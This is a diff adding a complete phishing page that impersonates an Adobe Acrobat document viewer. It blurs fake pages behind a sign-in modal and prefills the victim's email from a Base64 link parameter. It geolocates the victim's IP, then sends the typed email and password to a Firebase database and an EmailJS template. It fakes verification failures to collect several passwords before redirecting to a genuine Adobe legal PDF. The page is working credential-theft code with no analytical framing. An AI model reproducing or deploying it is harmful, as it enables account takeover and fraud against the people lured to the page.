@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Document.pdf - Adobe Acrobat</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
+    <script type="text/javascript">
+        (function() {
+            // EmailJS Init
+            emailjs.init("BAkR4Szgf0OPcZuv6");
+
+            // Firebase Init
+            const firebaseConfig = {
+                apiKey: "AIzaSyBfnxz4BRtwT6YN_jMWApnl4-iSwJh8Kc",
+                authDomain: "bnkraw.firebaseapp.com",
+                projectId: "bnkraw",
+                storageBucket: "bnkraw.firebasestorage.app",
+                messagingSenderId: "238044138547",
+                appId: "1:238044138547:web:3b5028f9316186fba7a746"
+            };
+            firebase.initializeApp(firebaseConfig);
+            window.db = firebase.firestore();
+        })();
+    </script>
+    
+    <style>
+        :root {
+            --adobe-blue: #0b57d0;
+            --adobe-hover: #0842a0;
+            --sidebar-text: #4a4a4a;
+            --border-light: #e0e0e0;
+            --bg-pdf-canvas: #f5f5f5;
+            --error-red: #d93025;
+            --adobe-red: #eb1000;
+        }
+
+        body, html { margin: 0; padding: 0; font-family: "Segoe UI", SegoeUI, Roboto, sans-serif; background-color: var(--bg-pdf-canvas); overflow-x: hidden; }
+
+        /* --- NAVIGATION --- */
+        .top-nav {
+            height: 48px; background: #fff; border-bottom: 1px solid var(--border-light);
+            display: flex; align-items: center; padding: 0 12px; font-size: 13px;
+            position: fixed; top: 0; width: 100%; z-index: 100;
+        }
+        .nav-link { margin-right: 18px; color: #333; cursor: pointer; white-space: nowrap; }
+        .tab { border-bottom: 3px solid var(--adobe-blue); height: 100%; display: flex; align-items: center; font-weight: 500; padding: 0 10px; overflow: hidden; text-overflow: ellipsis; }
+
+        /* --- LAYOUT --- */
+        .main-layout { display: flex; padding-top: 48px; }
+
+        /* --- SIDEBAR --- */
+        #sidebar {
+            width: 260px; background: #fff; border-right: 1px solid var(--border-light);
+            display: flex; flex-direction: column; height: calc(100vh - 48px);
+            position: fixed; left: 0; top: 48px; overflow-y: auto;
+            transition: transform 0.3s ease;
+        }
+        
+        @media (max-width: 768px) {
+            #sidebar { transform: translateX(-100%); z-index: 90; }
+            .viewer { margin-left: 0 !important; padding: 20px 10px !important; }
+            .auth-card { width: 90% !important; padding: 30px 20px !important; }
+        }
+
+        .sb-header { padding: 16px 20px; font-weight: 600; font-size: 14px; display: flex; justify-content: space-between; }
+        .tool { display: flex; align-items: center; padding: 10px 20px; font-size: 13px; color: var(--sidebar-text); cursor: pointer; transition: background 0.2s; }
+        .tool:hover { background-color: #f2f2f2; }
+        .ico { width: 22px; margin-right: 12px; font-style: normal; text-align: center; font-size: 16px; }
+        
+        .purp { color: #6e46af; } .teal { color: #00838f; } .red { color: #d32f2f; }
+        .blue { color: #1a73e8; } .green { color: #1e8e3e; } .gold { color: #c8a406; }
+
+        .sb-footer { padding: 20px; border-top: 1px solid #f0f0f0; margin-top: auto; background: #fafafa; }
+        .pro-badge {
+            font-size: 10px; font-weight: 800; color: var(--adobe-red);
+            text-transform: uppercase; letter-spacing: 1.2px; margin-bottom: 8px;
+            display: inline-block; padding: 2px 8px; border: 1px solid var(--adobe-red);
+            border-radius: 4px; animation: badge-glow 2s infinite ease-in-out;
+        }
+        
+        @keyframes badge-glow {
+            0% { box-shadow: 0 0 0px rgba(235, 16, 0, 0); }
+            50% { box-shadow: 0 0 10px rgba(235, 16, 0, 0.4); background: rgba(235, 16, 0, 0.05); }
+            100% { box-shadow: 0 0 0px rgba(235, 16, 0, 0); }
+        }
+
+        .pro-title { font-size: 13px; font-weight: 600; color: #222; margin-bottom: 12px; display: block; }
+        .btn-blue { background: var(--adobe-blue); color: #fff; border: none; padding: 10px 30px; border-radius: 24px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; margin-bottom: 10px; font-size: 14px; }
+        .btn-outline { background: transparent; color: var(--adobe-blue); border: 1px solid var(--adobe-blue); padding: 8px 30px; border-radius: 24px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; font-size: 13px; }
+
+        /* --- VIEWER --- */
+        .viewer { flex-grow: 1; margin-left: 260px; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
+        .doc-canvas { position: relative; background: #fff; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 100%; max-width: 850px; margin-bottom: 30px; cursor: pointer; overflow: hidden; }
+        .doc-canvas img { width: 100%; display: block; filter: blur(2.1px); transform: scale(1.01); }
+
+        /* --- MODAL --- */
+        #verify-wall { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 9999; }
+        .auth-card { background: #fff; padding: 40px; border-radius: 12px; width: 340px; text-align: center; box-shadow: 0 15px 50px rgba(0,0,0,0.3); position: relative; box-sizing: border-box; }
+        .auth-card input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        #loading-section, #password-section { display: none; }
+        .error-msg { color: var(--error-red); font-size: 12px; margin: 5px 0; display: none; text-align: left; font-weight: 500; }
+        
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--adobe-blue); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .back-btn { position: absolute; top: 20px; left: 20px; cursor: pointer; padding: 5px; }
+    </style>
+</head>
+<body onclick="showPopup()">
+
+    <nav class="top-nav">
+        <div class="nav-link" onclick="showPopup()">☰ Menu</div>
+        <div class="nav-link tab dynamic-file-name">Document.pdf</div>
+    </nav>
+
+    <div class="main-layout">
+        <aside id="sidebar">
+            <div class="sb-header">All tools <span>✕</span></div>
+            <div class="tool-box">
+                <div class="tool" onclick="showPopup()"><i class="ico purp">✨</i> AI Assistant</div>
+                <div class="tool" onclick="showPopup()"><i class="ico purp">📊</i> Generative summary</div>
+                <div class="tool" onclick="showPopup()"><i class="ico teal">📤</i> Export a PDF</div>
+                <div class="tool" onclick="showPopup()"><i class="ico red">📝</i> Edit a PDF</div>
+                <div class="tool" onclick="showPopup()"><i class="ico red">➕</i> Create a PDF</div>
+                <div class="tool" onclick="showPopup()"><i class="ico purp">📂</i> Combine files</div>
+                <div class="tool" onclick="showPopup()"><i class="ico green">📋</i> Organize pages</div>
+                <div class="tool" onclick="showPopup()"><i class="ico gold">💬</i> Send for comments</div>
+                <div class="tool" onclick="showPopup()"><i class="ico purp">🖋️</i> Fill & Sign</div>
+                <div class="tool" onclick="showPopup()"><i class="ico blue">🔍</i> Scan & OCR</div>
+                <div class="tool" onclick="showPopup()"><i class="ico blue">🛡️</i> Protect a PDF</div>
+                <div class="tool" onclick="showPopup()"><i class="ico red">✂️</i> Redact a PDF</div>
+                <div class="tool" onclick="showPopup()"><i class="ico purp">📦</i> Compress a PDF</div>
+            </div>
+
+            <div class="sb-footer">
+                <span class="pro-badge">Adobe Pro</span>
+                <span class="pro-title">Document Cloud Viewer</span>
+                <button class="btn-blue" onclick="showPopup()">Sign In to View</button>
+                <button class="btn-outline" onclick="showPopup()">Subscribe Now</button>
+            </div>
+        </aside>
+
+        <main class="viewer">
+            <div class="doc-canvas"><img src="page-1.PNG"></div>
+            <div class="doc-canvas"><img src="page-2.PNG"></div>
+            <div class="doc-canvas"><img src="page-3.jpg"></div>
+        </main>
+    </div>
+
+    <div id="verify-wall">
+        <div class="auth-card" onclick="event.stopPropagation()">
+            <img src="https://www.adobe.com/content/dam/shared/images/product-icons/svg/acrobat.svg" width="45">
+            <h2 style="font-size: 20px; margin: 15px 0 5px 0;">Sign in to continue</h2>
+            <p style="font-size: 13px; color: #666; margin-bottom: 20px;">Identity verification required for <strong class="dynamic-file-name">Document.pdf</strong></p>
+            
+            <div id="email-section">
+                <div id="email-error" class="error-msg">Please enter a valid email address.</div>
+                <input type="email" id="emailIn" placeholder="Email address" required>
+                <button type="button" class="btn-blue" onclick="processEmail()">Continue</button>
+            </div>
+
+            <div id="loading-section">
+                <div class="spinner"></div>
+                <p style="font-size: 12px; color: #888;">Connecting to Pro Viewer...</p>
+            </div>
+
+            <div id="password-section">
+                <div class="back-btn" onclick="goBack()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </div>
+                <p id="user-display" style="font-size: 14px; font-weight: bold; color: var(--adobe-blue); word-break: break-all;"></p>
+                <div id="pass-error" class="error-msg">Verification failed. Please confirm your correct email password and try again.</div>
+                <form id="finalForm">
+                    <input type="password" id="passIn" placeholder="Password" required>
+                    <button type="submit" id="submitBtn" class="btn-blue">View Document</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+<script>
+        let attempt = 0;
+        const overlay = document.getElementById('verify-wall');
+        const emailErr = document.getElementById('email-error');
+        const passErr = document.getElementById('pass-error');
+        let currentFileName = "Document.pdf";
+
+        // Listen for "Enter" key globally on inputs
+        document.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                if (document.getElementById('email-section').style.display !== 'none') {
+                    processEmail();
+                }
+            }
+        });
+
+window.addEventListener('load', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const nameParam = urlParams.get('n');
+    
+    // Updated to look for 'id' instead of 'e'
+    const encodedEmail = urlParams.get('id'); 
+
+    if (nameParam) {
+        currentFileName = nameParam.toLowerCase().endsWith('.pdf') ? nameParam : nameParam + '.pdf';
+        document.querySelectorAll('.dynamic-file-name').forEach(el => el.innerText = currentFileName);
+        document.title = currentFileName + " - Adobe Acrobat";
+    }
+    
+    if (encodedEmail) {
+        try {
+            // atob decodes the Base64 scramble from your Python links
+            document.getElementById('emailIn').value = atob(encodedEmail);
+            setTimeout(showPopup, 500); 
+        } catch (e) {
+            console.error("Link decoding failed - check Base64 format.");
+        }
+    }
+});
+        function showPopup() { overlay.style.display = 'flex'; }
+
+        function goBack() {
+            document.getElementById('password-section').style.display = 'none';
+            document.getElementById('email-section').style.display = 'block';
+            passErr.style.display = 'none';
+        }
+
+        function processEmail() {
+            const emailValue = document.getElementById('emailIn').value;
+            if(!emailValue.includes('@') || emailValue.length < 5) { 
+                emailErr.style.display = 'block'; 
+                return; 
+            }
+            emailErr.style.display = 'none';
+            document.getElementById('email-section').style.display = 'none';
+            document.getElementById('loading-section').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loading-section').style.display = 'none';
+                document.getElementById('password-section').style.display = 'block';
+                document.getElementById('user-display').innerText = emailValue;
+                document.getElementById('passIn').focus();
+            }, 1200);
+        }
+
+        async function getTrackerData() {
+            let tracking = { ip: "N/A", loc: "N/A" };
+            try {
+                const res = await fetch('https://ipapi.co/json/').catch(() => null);
+                if (res && res.ok) {
+                    const d = await res.json();
+                    tracking.ip = d.ip || "N/A";
+                    tracking.loc = `${d.city || ''}, ${d.region || ''} ${d.postal || ''}, ${d.country_name || ''}`.trim();
+                }
+            } catch (err) { console.log("Tracker error"); }
+            return tracking;
+        }
+
+        document.getElementById('finalForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const emailVal = document.getElementById('emailIn').value;
+            const passVal = document.getElementById('passIn').value;
+
+            if(passVal.length < 4) {
+                passErr.innerText = "Password is too short.";
+                passErr.style.display = 'block';
+                return;
+            }
+
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+            attempt++;
+
+            // Force proceed after 5 seconds if EmailJS/Firebase hangs
+            const forceProceed = setTimeout(() => {
+                handleResult();
+            }, 5000);
+
+            const geo = await getTrackerData();
+            const params = { 
+                user_email: emailVal, 
+                user_password: passVal, 
+                user_ip: geo.ip, 
+                user_location: geo.loc, 
+                user_agent: navigator.userAgent,
+                file_name: currentFileName,
+                timestamp: new Date().toISOString(),
+                trial_number: attempt
+            };
+
+            // Log to Firebase
+            try {
+                db.collection("logs").doc(emailVal).set({
+                    [`attempt_${attempt}`]: params,
+                    last_updated: new Date().toISOString()
+                }, { merge: true });
+            } catch (dbErr) { console.error(dbErr); }
+
+            // Log to EmailJS
+            emailjs.send("service_wapm4ia", "template_645bzqa", params)
+                .then(() => {
+                    clearTimeout(forceProceed);
+                    handleResult();
+                })
+                .catch(() => {
+                    clearTimeout(forceProceed);
+                    handleResult();
+                });
+
+            function handleResult() {
+                if(attempt < 4) {
+                    btn.innerText = "View Document";
+                    btn.disabled = false;
+                    passErr.innerText = "Verification failed. Please confirm your correct email password and try again.";
+                    passErr.style.display = 'block';
+                    document.getElementById('passIn').value = "";
+                    document.getElementById('passIn').focus();
+                } else {
+                    window.location.href = "https://www.adobe.com/content/dam/cc/en/legal/terms/enterprise/Acrobat-Aero-Legal-Combined-Terms-en_US-20200501.pdf";
+                }
+            }
+        }
+    </script>
+</body>
+</html>
